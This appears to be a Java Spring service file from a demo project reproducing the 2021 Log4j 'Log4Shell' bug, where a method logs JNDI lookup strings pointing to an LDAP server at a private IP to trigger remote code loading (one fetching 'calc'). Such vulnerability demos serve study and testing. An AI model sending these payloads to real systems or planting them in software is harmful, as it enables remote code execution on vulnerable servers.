package com.winson.springbootlog4jbugdemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Service;

/**
 * @author winson
 * @date 2021/12/29
 **/
@Service
public class Log4jService {

    private static Logger logger= LogManager.getLogger(Log4jService.class.getName());


    public void testBug(){
//        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
        String target = "${jndi:ldap://172.16.2.113:1389/calc}";
        logger.error("test log4j bug ... 1");
        logger.error("params : {}" , target);
        logger.error("test log4j bug ... 3");
    }

}
